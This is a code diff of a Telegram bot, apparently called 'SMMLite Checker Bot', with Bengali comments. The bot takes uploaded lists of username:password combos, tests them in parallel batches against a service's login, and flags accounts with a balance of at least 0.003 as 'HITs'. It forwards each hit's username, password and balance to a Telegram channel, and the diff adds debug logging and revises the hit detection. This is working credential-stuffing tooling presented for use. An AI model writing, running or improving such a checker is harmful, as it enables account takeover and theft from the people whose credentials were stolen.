@@ -1,9 +1,8 @@
-// api/telegram.js – SMMLite Bot (async background processing for large files)
+// api/telegram.js – SMMLite Bot (with debug logging and robust HIT detection)
 import { checkAccount } from '../lib/checkCore.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
-// একসাথে কয়টি অ্যাকাউন্ট চেক করবে (Concurrency)
-const CONCURRENCY = 20; // ২০টি প্যারালালে চেক করবে – দ্রুত ও নিরাপদ
+const CONCURRENCY = 20;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -19,7 +18,6 @@ export default async function handler(req, res) {
   const text = body.message.text;
   const document = body.message.document;
 
-  // ===== /start command =====
   if (text === '/start') {
     await sendMessage(chatId,
       "🤖 *SMMLite Checker Bot*\n\n" +
@@ -31,9 +29,7 @@ export default async function handler(req, res) {
     return res.status(200).json({ ok: true });
   }
 
-  // ===== File upload =====
   if (document && document.mime_type === 'text/plain') {
-    // 1. Download & parse file (quickly)
     const fileUrl = await getFileUrl(document.file_id);
     if (!fileUrl) {
       await sendMessage(chatId, "❌ Failed to get file.");
@@ -63,64 +59,60 @@ export default async function handler(req, res) {
       return res.status(200).json({ ok: false });
     }
 
-    // 2. IMMEDIATE response to Telegram (to avoid timeout)
+    // তাৎক্ষণিক রেসপন্স
     res.status(200).json({ ok: true });
 
-    // 3. Start background processing (non-blocking)
+    // ব্যাকগ্রাউন্ড প্রসেসিং
     setTimeout(() => processCombos(chatId, combos), 100);
-
-    return; // Response already sent
+    return;
   }
 
   return res.status(200).json({ ok: true });
 }
 
-// ===== ব্যাকগ্রাউন্ড প্রসেসিং ফাংশন =====
+// ===== ব্যাকগ্রাউন্ড প্রসেসিং =====
 async function processCombos(chatId, combos) {
   const total = combos.length;
   let hits = [];
   let processed = 0;
   const startTime = Date.now();
 
-  await sendMessage(chatId, `⏳ Starting check for *${total}* combos... (please wait)`);
+  console.log(`[DEBUG] Starting check for ${total} combos`);
+  await sendMessage(chatId, `⏳ Starting check for *${total}* combos...`);
 
-  // ব্যাচে ভাগ করে প্যারালালে চেক
   for (let i = 0; i < combos.length; i += CONCURRENCY) {
     const batch = combos.slice(i, i + CONCURRENCY);
 
-    // প্যারালালে চেক
     const batchPromises = batch.map(async (combo) => {
       try {
         const result = await checkAccount(combo.username, combo.password);
+        // LOG: দেখুন ব্যালেন্স কত আসছে
+        console.log(`[DEBUG] ${combo.username} -> balance: ${result.balance}, hit: ${result.hit}`);
         return { ...combo, result };
       } catch (err) {
+        console.error(`[ERROR] checkAccount failed for ${combo.username}:`, err.message);
         return { ...combo, result: { valid: false, hit: false, balance: 0, message: err.message } };
       }
     });
 
     const batchResults = await Promise.all(batchPromises);
 
-    // রেজাল্ট প্রসেস
     for (const item of batchResults) {
       processed++;
-      if (item.result.hit) {
+      // ===== HIT ডিটেক্ট – ব্যালেন্স ≥ ০.০০৩ হলে HIT =====
+      const isHit = item.result.balance >= 0.003 && item.result.valid;
+      if (isHit) {
         hits.push(item);
-        // হিট ফরওয়ার্ড
         await forwardToChannel(item.username, item.password, item.result);
       }
     }
 
-    // প্রতি ৫০টি কম্বো শেষে প্রগ্রেস মেসেজ
     if (processed % 50 === 0 || processed === total) {
       const percent = Math.round((processed / total) * 100);
       await sendMessage(chatId, `📊 Progress: ${processed}/${total} (${percent}%) | HITs: ${hits.length}`);
     }
-
-    // রেট লিমিট এড়াতে সামান্য বিরতি (যদি প্রয়োজন)
-    // await new Promise(r => setTimeout(r, 100));
   }
 
-  // ===== সারাংশ =====
   const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
   let summary = `✅ *Checking complete!*\nTotal: ${total}\n💰 HITS: ${hits.length}\n⏱️ Time: ${elapsed}s`;
 
@@ -131,6 +123,7 @@ async function processCombos(chatId, combos) {
     });
   }
   await sendMessage(chatId, summary);
+  console.log(`[DEBUG] Finished. Hits: ${hits.length}`);
 }
 
 // ========== হেল্পার ফাংশন ==========
@@ -193,5 +186,7 @@ async function forwardToChannel(username, password, result) {
         disable_web_page_preview: true
       })
     });
-  } catch(e) {}
+  } catch(e) {
+    console.error('forwardToChannel error:', e.message);
+  }
 }
